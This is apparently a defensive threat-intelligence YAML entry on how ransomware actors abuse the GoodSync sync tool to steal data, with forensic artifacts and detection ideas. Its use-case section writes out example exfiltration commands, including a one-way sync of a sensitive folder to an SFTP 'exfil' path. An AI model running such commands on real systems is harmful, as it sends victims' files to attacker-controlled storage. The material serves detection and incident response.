Name: GoodSync
Description: >
  Commercial file synchronization and backup tool supporting local, network, and cloud-based transfers.
  GoodSync provides both GUI and CLI execution, persistent sync jobs, and automated background operation.
  Threat actors, particularly ransomware groups, have abused GoodSync to exfiltrate large volumes of data
  by configuring one-way sync jobs to attacker-controlled cloud storage or SFTP servers, allowing data
  theft to blend in with legitimate backup or synchronization activity.
Category: third-party
Platform:
  - Windows
  - Linux
  - macOS
Execution:
  - gui
  - cli
Capabilities:
  - file-synchronization
  - recursive-upload
  - cloud-upload
  - sftp-upload
  - file-filtering
  - scheduled-execution
  - quiet-execution
  - background-execution
  - credential-storage
  - persistent-jobs
Forensics:
  BinaryLocations:
    - "C:\\Program Files\\GoodSync\\GoodSync.exe"
    - "C:\\Program Files\\GoodSync\\gsync.exe"
    - "/usr/bin/gsync"
    - "/usr/local/bin/gsync"
  FileNamePatterns:
    - GoodSync.exe
    - gsync.exe
    - GoodSync.log
  CommandLineArgs:
    Description: Command-line options commonly observed in malicious GoodSync-based exfiltration.
    Indicators:
      - gsync sync
      - /analyse
      - /dir
      - /exclude
      - /include
      - /oneway
      - /contact
  ConfigFiles:
    - "AppData\Local\GoodSync\server-accounts.tic"
    - "AppData\Local\GoodSync\GsAcct.tic"
    - "AppData\Local\GoodSync\jobs-groups-options-*.tic"
    - "AppData\Local\GoodSync\GoogleDriveCache\google-fs-cache.tic"
  RegistryPersistence:
    - "HKCU\Software\GoodSync"
    - "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\GoodSync"
  LogFiles:
    - "AppData\Local\GoodSync\log\GoodSync-YYYYMMDD-HHmm.log"
  NetworkArtifacts:
    Description: >
      GoodSync generates outbound connections to cloud storage providers or remote servers
      defined in sync job configurations. Because destinations depend on user-selected
      backends (cloud or SFTP), network indicators alone are insufficient for reliable
      detection without endpoint or configuration context.
    Indicators: []
  ScheduledTask: []
NetworkBehavior:
  Description: >
    GoodSync abuse is characterized by persistent background synchronization of large directory
    trees to remote destinations. Threat actors commonly configure one-way sync jobs that repeatedly
    upload new or modified files, allowing exfiltration to continue over extended periods while
    appearing similar to legitimate backup activity.
  Behaviors:
    - repeated outbound uploads to cloud or SFTP endpoints
    - long-lived background processes without user interaction
    - one-way synchronization with no inbound data
    - gradual or bulk transfer of large datasets
ThreatActors:
  - ransomware
UseCases:
  - Title: Bulk directory exfiltration to cloud storage
    Description: >
      Threat actors configure a GoodSync job targeting cloud storage to recursively upload
      large volumes of victim data.
    Command: "gsync sync /dir C:\Data /oneway /contact backblaze-profile"
  - Title: Silent CLI-based exfiltration
    Description: >
      gsync.exe used instead of the GUI for script-driven execution.
    Command: "gsync sync /dir /home/user/Documents /oneway"
  - Title: Targeted exfiltration using filters
    Description: >
      Include/exclude rules restrict uploads to high-value file types.
    Command: "gsync sync /dir C:\Users\Admin /include=*.pdf /exclude=*.iso"
  - Title: SFTP-based exfiltration
    Description: >
      Sync job uploads data to attacker-controlled SFTP infrastructure.
    Command: "gsync sync /dir C:\Sensitive /contact sftp://192.168.1.10/exfil/"
  - Title: Persistent automated sync job
    Description: >
      Saved GoodSync job continuously exfiltrates newly created or modified files.
    Command: "N/A"
Detection:
  - Type: Suspicious Sync Job Creation
    Description: >
      Detect creation or modification of GoodSync TIC files referencing new cloud or SFTP accounts.
  - Type: CLI Execution from Unusual Parent
    Description: >
      Alert when gsync.exe is spawned by PowerShell, wscript, mshta, psexec, or remote execution tools.
  - Type: Large Outbound Transfers
    Description: >
      Monitor high-volume uploads to cloud storage from non-backup systems.
  - Type: Silent Background Sync
    Description: >
      Detect gsync.exe running without GUI interaction combined with /oneway flags.
  - Type: Non-Standard SFTP Usage
    Description: >
      Flag outbound SFTP connections from endpoints not designated for backup.
References:
  - https://blog.talosintelligence.com/new-chaos-ransomware/
  - https://news.sophos.com/en-us/2025/05/20/a-familiar-playbook-with-a-twist-3am-ransomware-actors/
  - https://thehackernews.com/2025/07/chaos-raas-emerges-after-blacksuit.html
  - https://www.synacktiv.com/en/publications/legitimate-exfiltration-tools-summary-and-detection-for-incident-response-and-threat
